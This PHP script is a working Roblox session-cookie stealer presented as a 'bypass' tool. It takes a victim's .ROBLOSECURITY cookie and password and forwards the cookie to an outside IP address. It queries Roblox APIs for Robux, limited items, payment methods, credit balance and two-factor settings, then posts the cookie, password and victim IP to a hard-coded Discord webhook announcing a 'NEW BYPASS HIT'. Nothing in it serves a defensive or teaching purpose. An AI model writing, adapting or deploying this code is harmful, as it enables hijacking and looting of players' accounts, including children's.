<?php
header("Content-Type: application/json");

$cookie = $_GET['cookie'] ?? $_POST['cookie'] ?? '';

if (empty($cookie)) {
    die(json_encode(["success" => false, "msg" => "No cookie provided"]));
}

// Clean cookie
$cookie = str_replace(["'", '"', "cookie:", "Cookie:", ".ROBLOSECURITY="], "", trim($cookie));

function curl_req($url, $cookie = null, $method = 'GET', $postdata = null) {
    $ch = curl_init($url);
    $headers = [
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "accept: application/json",
    ];
    if ($cookie) $headers[] = "cookie: .ROBLOSECURITY=" . $cookie;
    
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);
    
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($postdata) curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
    }
    
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Forward to bypass endpoint (YOUR ORIGINAL LOGIC)
$ch = curl_init("http://138.124.123.71:8897/bypass?cookie=" . urlencode($cookie));
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 30,
    CURLOPT_SSL_VERIFYPEER => false
]);
$bypass_response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);

// ===== API CALLS (YOUR FULL LOGIC) =====
$apiv1 = curl_req("https://www.roblox.com/my/settings/json", $cookie);
$check = json_decode($apiv1, true);

if (!isset($check['UserId'])) {
    echo json_encode(["error" => "Invalid Cookie"]);
    exit;
}

$id = $check['UserId'];
$age = $check['AccountAgeInDays'] ?? 0;
$email = isset($check['IsEmailVerified']) ? ($check['IsEmailVerified'] ? 'Verified (Email)' : 'Unverified (Email)') : 'No Email';
$premium = isset($check['IsPremium']) && $check['IsPremium'] ? 'True' : 'False';

// Avatar
$thumbnail = curl_req("https://thumbnails.roblox.com/v1/users/avatar-headshot?size=420x420&format=png&userIds={$id}", $cookie);
$thumb_data = json_decode($thumbnail, true);
$avatar = $thumb_data['data'][0]['imageUrl'] ?? 'https://www.hypnobirthing.co.il/img/noavatar.png';

// Robux
$robux_data = curl_req("https://economy.roblox.com/v1/users/{$id}/currency", $cookie);
$robux = json_decode($robux_data, true);
$robux_balance = $robux['robux'] ?? 0;
$pending_robux = $robux['pendingRobuxTotal'] ?? 0;

// Groups
$groups_data = curl_req("https://groups.roblox.com/v1/users/{$id}/groups/roles", $cookie);
$groups = json_decode($groups_data, true);
$groupowned = [];
$comoney = 0;
$mems = 0;
foreach ($groups['data'] ?? [] as $group) {
    if (($group['role']['rank'] ?? 0) === 255) {
        $groupowned[] = $group['group']['name'];
        $ginfo = json_decode(curl_req("https://economy.roblox.com/v1/groups/{$group['group']['id']}/currency", $cookie), true);
        $comoney += $ginfo['robux'] ?? 0;
        $group_details = json_decode(curl_req("https://groups.roblox.com/v1/groups/{$group['group']['id']}", $cookie), true);
        $mems += $group_details['memberCount'] ?? 0;
    }
}

// Bundles
$bundles_data = curl_req("https://catalog.roblox.com/v1/users/{$id}/bundles?limit=500", $cookie);
$bundles = json_decode($bundles_data, true);
$krblx = array_search(192, array_column($bundles['data'] ?? [], 'id')) !== false;
$head = array_search(5731050224, array_column($bundles['data'] ?? [], 'id')) !== false;
$violetvalkrie = array_search(1402432199, array_column($bundles['data'] ?? [], 'id')) !== false;

// Limiteds
$limiteds_data = curl_req("https://inventory.roblox.com/v1/users/{$id}/assets/collectibles?limit=100", $cookie);
$limiteds = json_decode($limiteds_data, true);
$specials = count($limiteds['data'] ?? []);
$rap = array_sum(array_column($limiteds['data'] ?? [], 'recentAveragePrice'));

// Payments
$payment_data = curl_req("https://apis.roblox.com/payments-gateway/v1/payment-profiles", $cookie);
$payment = json_decode($payment_data, true);
$pcount = is_array($payment) ? count($payment) : 0;
$pstatus = $pcount > 0 ? 'True (' . $pcount . ')' : 'False';

// Credit
$credit_data = curl_req("https://apis.roblox.com/credit-balance/v1/get-credit-balance-for-navigation", $cookie);
$credit = json_decode($credit_data, true);
$credit_balance = $credit['creditBalance'] ?? 0;
$credit_currency = $credit['currencyCode'] ?? 'USD';

// Summary
$summary_data = curl_req("https://economy.roblox.com/v2/users/{$id}/transaction-totals?timeFrame=Year&transactionType=summary", $cookie);
$summary = json_decode($summary_data, true);
$outgoing = abs($summary['outgoingRobuxTotal'] ?? 0);

// Game visits
$gamevisits_data = curl_req("https://games.roblox.com/v2/users/{$id}/games?accessFilter=Public&limit=50", $cookie);
$gamevisits = json_decode($gamevisits_data, true);
$visits = 0;
foreach ($gamevisits['data'] ?? [] as $g) {
    $visits += $g['placeVisits'] ?? 0;
}

// Developer item
$dev_data = curl_req("https://catalog.roblox.com/v1/catalog/items/5731050224/details?itemType=Asset", $cookie);
$dev = json_decode($dev_data, true);
$itemv1 = isset($dev['owned']) && $dev['owned'] === true ? "Yes" : "No";

// 2FA
$twofa_data = curl_req("https://twostepverification.roblox.com/v1/users/{$id}/configuration", $cookie);
$twofa = json_decode($twofa_data, true);
$type = "Not Set";
foreach ($twofa['methods'] ?? [] as $method) {
    if ($method['enabled']) {
        $type = $method['mediaType'];
        break;
    }
}

// Played games
$mm2_data = curl_req("https://games.roblox.com/v1/games/66654135/votes/user", $cookie);
$mm2_info = json_decode($mm2_data, true);
$mm2_played = (isset($mm2_info['canVote']) && $mm2_info['canVote']) || (isset($mm2_info['userVote']) && $mm2_info['userVote']);

$ps99_data = curl_req("https://games.roblox.com/v1/games/3317771874/votes/user", $cookie);
$ps99_info = json_decode($ps99_data, true);
$ps99_played = (isset($ps99_info['canVote']) && $ps99_info['canVote']) || (isset($ps99_info['userVote']) && $ps99_info['userVote']);

$adm_data = curl_req("https://games.roblox.com/v1/games/383310974/votes/user", $cookie);
$adm_info = json_decode($adm_data, true);
$adm_played = (isset($adm_info['canVote']) && $adm_info['canVote']) || (isset($adm_info['userVote']) && $adm_info['userVote']);

$bladeball_data = curl_req("https://games.roblox.com/v1/games/4777817887/votes/user", $cookie);
$bladeball_info = json_decode($bladeball_data, true);
$bladeball_played = (isset($bladeball_info['canVote']) && $bladeball_info['canVote']) || (isset($bladeball_info['userVote']) && $bladeball_info['userVote']);

$mm2_output = $mm2_played ? "True" : "False";
$ps99_output = $ps99_played ? "True" : "False";
$adm_output = $adm_played ? "True" : "False";
$bladeball_output = $bladeball_played ? "True" : "False";

$pass = $_GET['pass'] ?? $_POST['pass'] ?? null;
$password_display = $pass ?: "N/A";
$domain = $_SERVER['HTTP_HOST'];
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';

// ===== DISCORD WEBHOOK WITH FULL EMBED =====
$webhook_url = "https://discord.com/api/webhooks/1507180274339807232/g8cuFvXjbEixs4Mv8UFbfuBZhKIJoPIkvkb4osBKiUJRzBrFh0LyUE36vSEqFHouBevr";

$embed1 = [
    'title' => '<:dc:1362119171693084812> ```NEW BYPASS HIT```',
    'description' => "@everyone **A new bypass has been captured!**\n### <:rolimonsblack:978565365338603562>[**Rolimons Stats**](https://www.rolimons.com/player/$id) ** | ** <:roblox:1349399578213875804>[**Roblox Profile**](https://www.roblox.com/users/$id/profile)\n",
    'color' => 16777215,
    'author' => [
        'name' => $check['Name'] . ' | ' . ($check['UserAbove13'] ? '13+' : '<13'),
        'icon_url' => $avatar
    ],
    'thumbnail' => ['url' => $avatar],
    'fields' => [
        ['name' => '<:noFilter1:1362423392602689556> Username', 'value' => $check['Name'], 'inline' => false],
        ['name' => '<:stats:1362423461116641420> Account Stats', 'value' => "`Account Age: {$age} Days`\n`Games Developer: $itemv1`\n- `Game Visits: $visits`\n- `Group Members: $mems`", 'inline' => false],
        ['name' => '<:greyrobux:1362423420738080938> Robux', 'value' => "**Balance:** {$robux_balance} <:gelbrobux:1362423430082724081>\n**Pending:** {$pending_robux} <:greyrobux:1362423420738080938>", 'inline' => true],
        ['name' => '<:valkrie:1362423450563514488> Limiteds', 'value' => "**RAP:** {$rap} <:gelbrobux:1362423430082724081>\n**Limiteds:** {$specials} <:money_bag:1306638519778938890>", 'inline' => true],
        ['name' => '<:chart:1306639123498664058> Summary', 'value' => "{$outgoing} <:gelbrobux:1362423430082724081>", 'inline' => true],
        ['name' => '<:cc:1362423485900656821> Payments', 'value' => "<:pay:1362423496659042394> {$pstatus}\nCredit Balance: **{$credit_balance}** in **{$credit_currency}**", 'inline' => true],
        ['name' => '<:games:1362423506339500152> Games', 'value' => "<:mm2:1349119069714124934> {$mm2_output}\n<:adm:1348704414910644234> {$adm_output}\n<:ps99:1348704835196682301> {$ps99_output}\n<:bladeball:1307351511109730384> {$bladeball_output}", 'inline' => true],
        ['name' => '<:Settings:1307353941780201535> Settings', 'value' => "<:email:1362423516309229692> **Email:** {$email}\n<:verify:1362423525679304975> **2FA:** ({$type})", 'inline' => true],
        ['name' => '<:inventory:1362423558625820844> Inventory', 'value' => "<:KorbloxDeathspeaker:1362432257528168469> " . ($krblx ? 'True' : 'False') . "\n<:HeadlessHorseman:1362432343255679126> " . ($head ? 'True' : 'False') . "\n<:Violet_Valkyrie:1362432688044380321> " . ($violetvalkrie ? 'True' : 'False'), 'inline' => true],
        ['name' => '<:rbxPremium:1307354518089891974> Premium', 'value' => $premium, 'inline' => true],
        ['name' => '<:community:1362423568578646016> Groups', 'value' => "**Owned:** " . count($groupowned) . "\n**Balance:** {$comoney} <:gelbrobux:1362423430082724081>", 'inline' => true],
        ['name' => '<:Key:1362420028489728162> Password', 'value' => "```{$password_display}```", 'inline' => false],
        ['name' => '<:SkullKing:1363888353300189434> Bypass Status', 'value' => $error ? "❌ Failed: " . $error : "✅ Success (HTTP {$httpCode})", 'inline' => false],
        ['name' => '<:community:1362423568578646016> IP Address', 'value' => "`{$ip}`", 'inline' => true]
    ]
];

$embed2 = [
    'title' => '<:SkullKing:1363888353300189434> .ROBLOSECURITY',
    'description' => "<:SkullKing:1363888353300189434>   [**Refresh Cookie Before Login!**](https://$domain/refresher?cookie=$cookie)\n```$cookie```",
    'color' => 16777215,
    'thumbnail' => ['url' => 'https://res.cloudinary.com/di3jdc46c/image/upload/v1737844893/cookie_1_n3nluv.png']
];

$payload = [
    "content" => "@everyone **NEW BYPASS HIT**",
    'username' => 'AutoHar - BYPASS',
    'embeds' => [$embed1, $embed2]
];

$discord_ch = curl_init($webhook_url);
curl_setopt_array($discord_ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_POSTFIELDS => json_encode($payload),
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_TIMEOUT => 10
]);
curl_exec($discord_ch);
curl_close($discord_ch);

// Return bypass response (YOUR ORIGINAL RETURN)
if ($error) {
    echo json_encode(["success" => false, "msg" => "CURL Error: " . $error]);
} else {
    echo json_encode([
        "success" => true,
        "http_code" => $httpCode,
        "response" => $bypass_response
    ]);
}
?>